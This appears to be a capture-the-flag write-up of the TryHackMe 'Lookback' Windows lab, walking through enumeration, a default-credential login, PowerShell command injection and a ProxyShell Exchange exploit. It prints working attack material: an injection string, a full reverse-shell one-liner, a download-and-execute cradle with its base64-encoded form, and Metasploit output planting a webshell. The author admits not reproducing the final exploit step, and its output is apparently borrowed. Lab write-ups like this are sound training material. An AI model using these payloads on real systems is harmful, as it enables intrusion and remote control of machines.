---
title: "TryHackMe - Lookback"
author: Nasrallah
description: ""
date: 2024-12-03 07:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, windows, medium, cve, exchange, commandinjection, metasploit]
img_path: /assets/img/tryhackme/lookback
image:
    path: lookback.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Lookback](https://tryhackme.com/r/room/lookback) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) starts with a command injection on a website giving us foothold, then we exploit an RCE on MS exchange to get administrator.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.232.130
Host is up (0.11s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
443/tcp  open  https?
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http     Microsoft Windows RPC over HTTP 1.0
3389/tcp open  ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2024-10-24T08:55:08
|_Not valid after:  2025-04-25T08:55:08
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-25T09:01:02
|_  start_date: N/A
```

The target seems to be a windows machine with two web servers on port 80 and 443, SMB and RDP.

Nmap also reveals the hostname `WIN-12OUO7A66M7.thm.local`.

### Web

Let's check the website on port 80.

Nothing, Let's try https.

![webpage](1.png)

It's an outlook login page. We don't have any credentials though

I tried SMB but couldn't list any shares.

Let's run a directory scan.

```terminal
┌─[]─[10.11.111.120]─[sirius@parrot]─[~/ctf/thm/loopback]
└──╼ [★]$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.10.61.122/ -n
                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.61.122/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        3l        8w      207c http://10.10.61.122/ecp => https://10.10.61.122/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.61.122%2fecp&reason=0
403      GET       29l       92w     1233c http://10.10.61.122/test
[####################] - 5m     20482/20482   0s      found:2       errors:10     
[####################] - 5m     20477/20477   64/s    http://10.10.61.122/ 
```

We found `/test/`. Let's check it

![httpauth](2.png)

We go a basic http authentication. I tried `admin:admin` and managed to login successfully.

![1stflag](3.png)

We got a `Log analyzer`, and it seems we can request files.

I directly tried a command injection and got the following.

![getcontent](4.png)

We can see that it uses powershell `Get-Content` to retrieve the file.

```powershell
Get-Content('C:\file')
```

To get command execution we need to break out of the function first then run our command.

We can do that by closing the single quotes first and then the parentheses `')`. After we add semi-colon `;` then the command we want to execute `whoami` and we don't forget to comment the rest of the code by adding `#` at the end.

```powershell
BitlockerActiveMonitoringLogs') ; whoami #
```

![whoami](5.png)

It worked!

## **Foothold**

Now let's get a reverse shell.

We can use `Nishang's Invoke-PowershellTcpOneLine.ps1` script located at `/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1`.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.14.91.207',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

>Don't forget the change the ip address to your tun0 ip

i'll put the command in a file and name it `shell.ps1`

Now we will create out command that's going to request this file and run it after that to get a shell. This also known as a `Web Cradle`.

```powershell
IEX(New-Object Net.WebClient).downloadString("http://10.14.91.207/shell.ps1")
```

Now we need to encode it to `utf-16le` because that is what powershell likes and then encode it with base64.

```bash
echo 'IEX(New-Object Net.WebClient).downloadString("http://10.14.91.207/shell.ps1")' | iconv -t utf-16le | base64 -w 0;echo
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEANAAuADkAMQAuADIAMAA3AC8AcwBoAGUAbABsAC4AcABzADEAIgApAAoA
```

It gave us a long base64 string. To execute it we need to prepend it with `powershell -enc`.

```powershell
powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEANAAuADkAMQAuADIAMAA3AC8AcwBoAGUAbABsAC4AcABzADEAIgApAAoA
```

Now we setup a http sever for the `shell.ps1`.

```bash
sudo python3 -m http.server 80
```

And we replace whoami on the web log analyzer with the command above and send it.

We setup out listener now and wait

I'll be using `PowerShell #3 (Base64)` from <https://www.revshells.com>.

![shell](6.png)

```terminal
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.14.91.207] from (UNKNOWN) [10.10.88.238] 6806

PS C:\windows\system32\inetsrv> whoami
thm\admin
PS C:\windows\system32\inetsrv>
```

And great! we got a shell.

## **Privilege Escalation**

Looking through the system files we find user `dev` and the following file on their desktop.

```terminal
PS C:\users\dev\desktop> cat TODO.txt
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

One interesting task that hasn't been done yet is `Install the Security Update for MS Exchange`.

There is a Remote Code Execution vulnerability in MS Exchange that we can try.

Let's run `metasploit` and use the `exploit/windows/http/exchange_proxyshell_rce` module.

We set Email to `dev-infrastracture-team@thm.local`, the rhosts and lhost.

```terminal
msf6 exploit(windows/http/exchange_proxyshell_rce) > run

[*] Started reverse TCP handler on 10.9.65.100:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
[*] Saving a draft email with subject 'qJsINJcx' containing the attachment with the embedded webshell
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\5YGhwaT2.aspx
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (200774 bytes) to 10.10.249.49
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\5YGhwaT2.aspx
[*] Meterpreter session 1 opened (10.9.65.100:4444 -> 10.10.249.49:17646) at 2023-04-16 23:37:42 +0200
[*] Removing the mailbox export request
[*] Removing the draft email

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

>I was not able to exploit this myself as well as other people I found on the TryHackMe's discord server. Feel free to contact me if you find a way to do it.
{: .prompt-info }

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References
